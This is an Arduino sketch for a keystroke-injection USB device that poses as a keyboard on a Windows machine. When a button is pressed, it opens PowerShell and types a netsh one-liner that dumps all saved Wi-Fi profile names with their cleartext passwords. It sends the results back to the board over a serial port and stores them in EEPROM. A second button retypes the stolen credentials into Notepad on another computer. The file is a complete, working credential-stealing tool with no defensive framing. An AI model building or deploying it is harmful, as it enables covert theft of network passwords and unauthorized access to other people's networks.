#include <Keyboard.h>
#include <EEPROM.h>
char stringArray[500] = {""};
boolean extracted = false, dispatched = false;
int extractButton = 2, dispatchButton = 3;

void setup() {    Serial.begin(9600);
    pinMode(extractButton, INPUT);
    pinMode(dispatchButton, INPUT);
    Keyboard.begin();
}
void loop() {
    if(digitalRead(extractButton) == HIGH && !extracted) {
        extractingData();
        extracted = true;
    }
    if(digitalRead(dispatchButton) == HIGH && !dispatched) {
        dispatchingData();
        dispatched = true;
    }    if(digitalRead(extractButton) == LOW)
        extracted = false;
    if(digitalRead(dispatchButton) == LOW)
        dispatched = false;
}

void extractingData() {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("Powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String -OutVariable dataCaptured");
    delay(500);

    Keyboard.println("$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    delay(200);
    Keyboard.println("$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\")");
    delay(200);
    Keyboard.print("$serialObject = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$comPort");
    Keyboard.println(", 9600, None, 8, one");
    delay(200);
    Keyboard.println("$serialObject.Open()");
    delay(200);
    Keyboard.println("$serialObject.Write(\"$dataCaptured\")");
    delay(200);
    Keyboard.println("$serialObject.close()");
    delay(200);
    Keyboard.println("exit");
    delay(200);
    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}

void dispatchingData() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.println("notepad");
    delay(700);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print(EEPROM.get(1, stringArray));
}
